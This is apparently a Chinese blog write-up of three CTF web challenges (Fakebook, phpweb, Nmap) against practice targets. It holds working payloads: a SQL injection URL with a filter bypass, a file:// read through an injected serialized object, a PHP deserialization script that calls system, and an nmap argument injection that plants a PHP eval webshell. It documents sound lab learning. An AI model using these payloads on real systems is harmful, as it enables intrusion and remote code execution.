@@ -1,0 +1,51 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-atom-one-dark" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<p>1.[网鼎杯 2018]Fakebook<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e78e18a0069b4e6faa9681a87a3e05b2.png"/></p>
+<p>打开连接是一个类似于论坛的一个web应用，有登录和注册，首先在登录处试了试sql注入，失败了，然后乖乖去注册，在注册的时候想到了xss，试验后发现也并不可行。只能乖乖登录找bug了</p>
+<p>登陆后发现用户名有超链接，点进入后就发现url是这样的</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/10de0a0000c143529e27cdc0d4771415.png"/><br/> 自然而然又想到了sql注入，测试后发现可以的，然后按流程，先用order by测试字段数，然后依次爆数据库名，表名，字段名 (过程中发现后端过滤的union select 的组合，测试后用/* */绕过)</p>
+<p>构造url为<code>http://6640d1b5-e1a8-45bb-b9f6-26bbdee8d84f.node4.buuoj.cn:81/view.php?no=2%20%20union%20/**/%20select%201,group_concat(column_name),2,3%20from%20information_schema.columns%20where%20table_name=%27users%27</code></p>
+<p>得到字段名如下<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cf56035f97b742f69fe9754f77f41a72.png"/></p>
+<p>其中只有data数据不知道是啥，我看了一下发现是一个序列化的字符串。<br/> 我自己勉强就做到这了，然后去看wp，这里用目录扫描可以扫到robots.txt和flag.php，打开robots.txt可以发现有一个php文件的备份文件，下载后打开。</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8ee3b6db03ff4e028a07db73b1e579ca.png"/><br/> 其中比较关键的就是这个get函数了，查阅curl的资料可以得知，此处get函数主要就是在打开一个url，而这个url就是我们那个blog的url，因此这里是由文件包含漏洞的，我们可以设置blog的url为file:///var/www/html/flag.php，然后就可以读取flag.php了。</p>
+<p>构造url为<code>http://6640d1b5-e1a8-45bb-b9f6-26bbdee8d84f.node4.buuoj.cn:81/view.php?no=2%20%20union%20/**/%20select%201,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:18;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27</code><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/00a9d9ed438c4175ac4345b0ff6bf435.png"/><br/> 打开页面中会有一段base64的编码，解码后即为flag。</p>
+<p>2.[网鼎杯 2020 朱雀组]phpweb</p>
+<p>拿到题后查看源代码，发现表单里的两个参数是func和p，我突然后意识到可能是在函数名和参数，然后我试了一下。</p>
+<p>用bp抓包然后修改func=hightlight_file和p=index.php。</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c23e40fbd3734de59a2aed5a648cf530.png"/><br/> 说明猜测正确，在后端用call|_user_func来运行函数，但是过滤很多函数，如exec，system等等（后面还有很多，截图没截上）。</p>
+<p>我首先想到的是用include函数结合php伪协议上传shell，但是发现call|_user_func不能运行include函数，然后又想绕过in_array黑名单，但好像也不太可行。</p>
+<p>然后发现代码中有两处调用call|_user_func函数，而且Test类中的调用没有黑名单检测，我猜测这可能是个突破点，但是搞了半天也没搞出来，无奈还是去搜了wp。<br/> 发现我到此为止都是没问题，Test也确实是个突破点，如何突破了，用反序列化，就是unserialize函数，然后写了一个php脚本</p>
+<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{<!-- --></span>
+        
+        <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
+        
+    <span class="token punctuation">}</span>
+    <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>得到序列化的字符串后发送，然后并没有找到比较明显有flag的文件，然后可以查找，用<code>find / -name flag*</code></p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1f648a73798a45eda0e74b1018d4b869.png"/></p>
+<p>然后去cat /tmp/flagoefiu4r93得到flag。</p>
+<p>3.[网鼎杯 2020 朱雀组]Nmap</p>
+<p>经过将网页扫描结果与真是nmap扫描结果进行对比，发现很一致，所以猜测网页后端就是调用了nmap命令，那我们就可以使用一些奇奇怪怪的命令了。</p>
+<p>-oN (标准输出)</p>
+<p>-oX (XML输出)</p>
+<p>-oS (ScRipT KIdd|3 oUTpuT)</p>
+<p>-oG (Grep输出)</p>
+<p>-oA (输出至所有格式)</p>
+<p>可以创建shell文件</p>
+<pre><code class="prism language-php"><span class="token string single-quoted-string">' &lt;?= @eval($_POST[1]);?&gt; -oG a.phtml '</span>
+</code></pre>
+<p>因为过滤了php，因此用短标签&lt;?= ?&gt;代替，然后就看了大佬的wp，用单引号和空格绕过escapeshellarg()与escapeshellcmd()函数（纯纯知识盲区）</p>
+<p>然后就可以用蚁剑或菜刀连接，找到flag咯。</p>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
